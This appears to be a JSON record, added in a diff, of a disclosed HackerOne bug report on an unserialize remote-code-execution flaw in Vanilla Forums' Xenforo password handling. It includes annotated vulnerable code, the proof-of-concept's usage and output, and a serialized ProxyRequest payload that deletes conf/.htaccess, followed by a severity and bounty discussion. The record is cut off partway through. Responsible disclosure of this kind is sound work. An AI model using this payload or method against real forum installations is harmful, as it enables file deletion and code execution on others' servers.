@@ -1,0 +1,647 @@
+{
+  "id": 410212,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTAyMTI=",
+  "url": "https://hackerone.com/reports/410212",
+  "title": "Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-15T22:22:53.238Z",
+  "submitted_at": "2018-09-15T22:22:53.238Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_me",
+    "url": "/mr_me",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-23T15:46:49.166Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:46:39.331Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAn authenticated admin user can inject an unserializable password in a another users account. Later when attempting a login with that user, the attacker can trigger a call to an unserialize in the splitHash function. By using a custom pop chain to write into the constants.php file, an attacker can leverage this to gain remote code execution.\n\n## Notes:\n\n- You need to have an admin account to run this poc.\n- This poc will simply delete the conf/.htaccess file assuming the right permissions are set\n- Please note that this poc will not clean up after itself, you will need to remove the back door user\n\n## Analysis:\n\nInside of applications/dashboard/controllers/class.entrycontroller.php we can see the following code\n\n```\nclass EntryController extends Gdn_Controller {\n\n    ...\n\n    public function signIn($method = false, $arg1 = false) {\n        if (!$this->Request->isPostBack()) {\n            $this->checkOverride('SignIn', $this->target());\n        }\n\n        Gdn::session()->ensureTransientKey();\n\n        $this->addJsFile('entry.js');\n        $this->setData('Title', t('Sign In'));\n        $this->Form->addHidden('Target', $this->target());\n        $this->Form->addHidden('ClientHour', date('Y-m-d H:00')); // Use the server's current hour as a default.\n\n        // Additional signin methods are set up with plugins.\n        $methods = [];\n\n        $this->setData('Methods', $methods);\n        $this->setData('FormUrl', url('entry/signin'));\n\n        $this->fireEvent('SignIn');\n\n        if ($this->Form->isPostBack()) {\n            $this->Form->validateRule('Email', 'ValidateRequired', sprintf(t('%s is required.'), t(UserModel::signinLabelCode())));\n            $this->Form->validateRule('Password', 'ValidateRequired');\n\n            if (!$this->Request->isAuthenticatedPostBack() && !c('Garden.Embed.Allow')) {\n                $this->Form->addError('Please try again.');\n            }\n\n            // Check the user.\n            if ($this->Form->errorCount() == 0) {\n                $email = $this->Form->getFormValue('Email');\n                $user = Gdn::userModel()->getByEmail($email);\n                if (!$user) {\n                    $user = Gdn::userModel()->getByUsername($email);\n                }\n\n                if (!$user) {\n                    $this->addCredentialErrorToForm('@'.sprintf(t('User not found.'), strtolower(t(UserModel::signinLabelCode()))));\n                    Logger::event('signin_failure', Logger::INFO, '{signin} failed to sign in. User not found.', ['signin' => $email]);\n                    $this->fireEvent('BadSignIn', [\n                        'Email' => $email,\n                        'Password' => $this->Form->getFormValue('Password'),\n                        'Reason' => 'NotFound'\n                    ]);\n                } else {\n                    // Check the password.\n                    $passwordHash = new Gdn_PasswordHash();\n                    $password = $this->Form->getFormValue('Password');\n                    try {\n                        $passwordChecked = $passwordHash->checkPassword($password, val('Password', $user), val('HashMethod', $user));           // 1\n```\n\nSince we can create a user as an admin controlling the hash method and password, at [1] we can reach the checkPassword() call using data coming from the database. Then, in library/core/class.passwordhash.php we can see the definition of the checkPassword():\n\n```\nclass Gdn_PasswordHash {\n\n    ...\n\n    public function checkPassword($password, $storedHash, $method = false) {\n        $result = false;\n\n        if (empty($password) || empty($storedHash)) {\n            // We don't care if there is a strong password hash. Empty passwords are not cool\n            return false;\n        }\n\n        switch (strtolower($method)) {\n\n        ...\n\n            case 'xenforo':\n                $result = $this->getAlgorithm('Xenforo')->verify($password, $storedHash);           // 2\n```\n\nAt [2] we can see that of the `$method` is set to xenforo, the code will call the `verify()` function on the instance of the XenforoPassword class using the stored hash in the db. Then, within the vendor/vanilla/garden-password/src/XenforoPassword.php file we see the following `verify()` function:\n\n```\nclass XenforoPassword implements PasswordInterface {\n\n    ...\n\n    /**\n     * {@inheritdoc}\n     */\n    public function needsRehash($hash) {\n        list($storedHash, $storedSalt) = $this->splitHash($hash);\n\n        // Unsalted hashes should be rehashed.\n        return $storedHash === false || $storedSalt === false;\n    }\n\n    /**\n     * {@inheritdoc}\n     */\n    public function verify($password, $hash) {\n        list($storedHash, $function, $storedSalt) = $this->splitHash($hash);                // 3\n\n        $calcHash = $this->hashRaw($password, $storedSalt, $function, $storedHash);\n        $result = $calcHash === $storedHash;\n\n        return $result;\n    }\n\n    ...\n\n    private function splitHash($hash) {\n        $parts = @unserialize($hash);                                                       // 4\n```\n\nAt [3] the code calls `splitHash()` which will lead to an unserialize call at [4].\n\n## Exploitation:\n\nAn authenticated attacker can create an account that has an unserializable string inside of the password. Once the user attempts to login, the password is unserialized by the above code. At first, exploitation seems limited because there is a max char limit of 100 chars for the password when creating the user. This is not enough to use the rce pop chain I created. \n\n```\nmysql> describe GDN_User;\n+--------------------------+-------------------+------+-----+---------+----------------+\n| Field                    | Type              | Null | Key | Default | Extra          |\n+--------------------------+-------------------+------+-----+---------+----------------+\n| UserID                   | int(11)           | NO   | PRI | NULL    | auto_increment |\n| Name                     | varchar(50)       | NO   | MUL | NULL    |                |\n| Password                 | varbinary(100)    | NO   |     | NULL    |                |        <-- limited at the db level\n```\n\nHowever we can just use the phar:// technique to trigger a second stage pop chain because we can reach a controlled files_exists(). Inside of library/core/class.proxyrequest.php:\n\n```\nclass ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this->CookieJar)) {                // 1\n            unlink($this->CookieJar);                       // 2\n        }\n    }\n```\n\nAt [1] we can leverage this to reach a second stage unserialize(). Think of it like a second order unserialize. Then at [2] we can of course delete any file. This was the option I went for since this is just a poc.\n\n## Example:\n\n```\nsaturn:vanilla_forums_xenforo_splithash_unserialize_rce mr_me$ ./poc.py \n(+) usage: ./poc.py <target> <username:password>\n(+) eg: ./poc.py 172.16.175.143 admin:admin123\n\nsaturn:vanilla_forums_xenforo_splithash_unserialize_rce mr_me$ ./poc.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) created a pwner account and injected a serialized object in the password!\n(+) deleted conf/.htaccess!\n(+) modify this exploit if you want to execute remote code ;-)\n```\n\nChecking the target server...\n\n```\nsteven@pluto:/var/www/html/conf$ ls -la .htaccess \n-rwxrwxrwx 1 www-data www-data 13 Sep 15 18:30 .htaccess\nsteven@pluto:/var/www/html/conf$ ls -la .htaccess \nls: cannot access '.htaccess': No such file or directory\n```\n\nWhoops.\n\n## Impact\n\nAn authenticated attacker can gain remote code execution, however in this poc I just created a pop chain that will delete a file as a poc. I think I have already demonstrated rce via another unserialize, don't really need to do it again I think.",
+  "bounty_amount": "300.0",
+  "formatted_bounty": "$300",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 346846,
+      "file_name": "vanilla_forums_xenforo_splithash_unserialize_rce.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/346/846/3a3a2e09be5a366bfeb3593f0b20740ed07f71ef/vanilla_forums_xenforo_splithash_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_xenforo_splithash_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_xenforo_splithash_unserialize_rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074706Z&X-Amz-Expires=653&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1cbbffd8256cfcd40e3fe0bc5e8b9f4f47db229764013e451e5bc3ef758aa2d7",
+      "file_size": 145730,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-23T15:46:39.390Z",
+  "allow_singular_disclosure_after": -152467226.6253646,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "irek",
+    "fqdn",
+    "inhibitor181",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "ahiezer",
+    "theappsec",
+    "harry_mg",
+    "f_m",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3342399,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Post exploitation, it may look something like this:\n\n```\nmysql> select Name, Password, Email, HashMethod from GDN_User where HashMethod=\"Xenforo\";\n+----------------------------------+----------------------------------------------------------------+-----------------------------------------------+------------+\n| Name                             | Password                                                       | Email                                         | HashMethod |\n+----------------------------------+----------------------------------------------------------------+-----------------------------------------------+------------+\n| jxupdgqeydfyewmrzvcnpyeqoyvuvsou | O:12:\"ProxyRequest\":1:{s:9:\"CookieJar\";s:14:\"conf/.htaccess\";} | jxupdgqeydfyewmrzvcnpyeqoyvuvsou@srcincite.io | Xenforo    |\n| tafivppinffznsighlftzriwkftjfqzw | O:12:\"ProxyRequest\":1:{s:9:\"CookieJar\";s:14:\"conf/.htaccess\";} | tafivppinffznsighlftzriwkftjfqzw@srcincite.io | Xenforo    |\n+----------------------------------+----------------------------------------------------------------+-----------------------------------------------+------------+\n2 rows in set (0.00 sec)\n```",
+      "automated_response": false,
+      "created_at": "2018-09-15T22:51:16.863Z",
+      "updated_at": "2018-09-15T22:51:16.863Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3348705,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there. Your report has been assigned to a developer who  will provide a feedback shortly.\nThank you.",
+      "automated_response": false,
+      "created_at": "2018-09-17T12:48:52.840Z",
+      "updated_at": "2018-09-17T12:48:52.840Z",
+      "actor": {
+        "username": "dexterr",
+        "cleared": false,
+        "verified": false,
+        "url": "/dexterr",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3349527,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "This has been triaged.\nThank you.",
+      "automated_response": false,
+      "created_at": "2018-09-17T15:49:35.912Z",
+      "updated_at": "2018-09-17T15:49:35.912Z",
+      "actor": {
+        "username": "manwithnoname",
+        "cleared": false,
+        "verified": false,
+        "url": "/manwithnoname",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3358141,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-19T12:41:45.095Z",
+      "updated_at": "2018-09-19T12:41:45.095Z",
+      "additional_data": {
+        "old_severity": "High (7.5)",
+        "new_severity": "Critical (9.1)",
+        "old_severity_id": 210546,
+        "new_severity_id": 211865
+      },
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3358146,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-19T12:42:55.468Z",
+      "updated_at": "2018-09-19T12:42:55.468Z",
+      "additional_data": {
+        "old_severity": "Critical (9.1)",
+        "new_severity": "High (8.0)",
+        "old_severity_id": 211865,
+        "new_severity_id": 211866
+      },
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3358150,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-19T12:43:22.434Z",
+      "updated_at": "2018-09-19T12:43:22.434Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "bounty_amount": "300.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "vanilla",
+      "collaborator": {
+        "username": "mr_me",
+        "url": "/mr_me"
+      }
+    },
+    {
+      "id": 3358402,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, thanks for the offer, however I can demonstrate rce with this. Would this up the bounty?",
+      "automated_response": false,
+      "created_at": "2018-09-19T13:44:19.470Z",
+      "updated_at": "2018-09-19T13:44:19.470Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3358519,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I scored it as an RCE, but with an Attack Complexity of 'High' (a number of factors can thwart the phar exploit / second step) and a Privileges Required of 'High' (admin). That brings the score to 8.0, or High.",
+      "automated_response": false,
+      "created_at": "2018-09-19T14:05:54.222Z",
+      "updated_at": "2018-09-19T14:05:54.222Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3358831,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ah ok fair call @linc cheers.",
+      "automated_response": false,
+      "created_at": "2018-09-19T15:11:51.376Z",
+      "updated_at": "2018-09-19T15:11:51.376Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3360615,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Actually, I disagree because the second step doesn't require any additional privileges, etc and it's just as high impact as, say [410237](https://hackerone.com/reports/410237). Here is my RCE PoC. Can you adjust the bounty please?",
+      "automated_response": false,
+      "created_at": "2018-09-19T23:54:24.502Z",
+      "updated_at": "2018-09-19T23:54:24.502Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 348498,
+          "filename": "rce.zip",
+          "type": "application/zip",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/348/498/11e1e946b21c0e79f51372d92c6f6cde2d6dc733/rce.zip?response-content-disposition=attachment%3B%20filename%3D%22rce.zip%22%3B%20filename%2A%3DUTF-8%27%27rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074706Z&X-Amz-Expires=653&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0156ff3341e9fb2c912014139e6248f075a2aa9673cae0248f5debffcb95d50f"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3362940,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> An authenticated admin user can inject an unserializable password in a another users account.\n\nAre you saying you can do this step without administrator permissions?\n\nLowering the privileges required means ALL steps may be completed at that level.",
+      "automated_response": false,
+      "created_at": "2018-09-20T14:27:40.230Z",
+      "updated_at": "2018-09-20T14:27:40.230Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3363030,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "No, I mean the additional second step also needs admin privileges but all the primitives exist to get full, reliable rce at that same privilege level. Just because there is a second step, doesn't mean the impact is any different to [410237](https://hackerone.com/reports/410237) for example, hence my rce poc.",
+      "automated_response": false,
+      "created_at": "2018-09-20T14:51:49.640Z",
+      "updated_at": "2018-09-20T14:52:11.243Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3371586,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Impact is only part of the CVSS calculation. Are you able to view my calculation and tell me which criteria's setting you find to be misrepresented? I'm not suggesting the impact is different than other RCE vulnerabilities, I'm simply acknowledging there are higher prerequisites. The standard CVSS calculation takes that into account and it diminishes the severity.",
+      "automated_response": false,
+      "created_at": "2018-09-22T00:38:52.082Z",
+      "updated_at": "2018-09-22T00:38:52.082Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3371665,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I can’t see your CVSS score, but yes, if you mark it like that then it makes sense.",
+      "automated_response": false,
+      "created_at": "2018-09-22T01:42:09.146Z",
+      "updated_at": "2018-09-22T01:43:33.293Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3406139,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @linc, hows the patch looking for this? Is it rolled out?",
+      "automated_response": false,
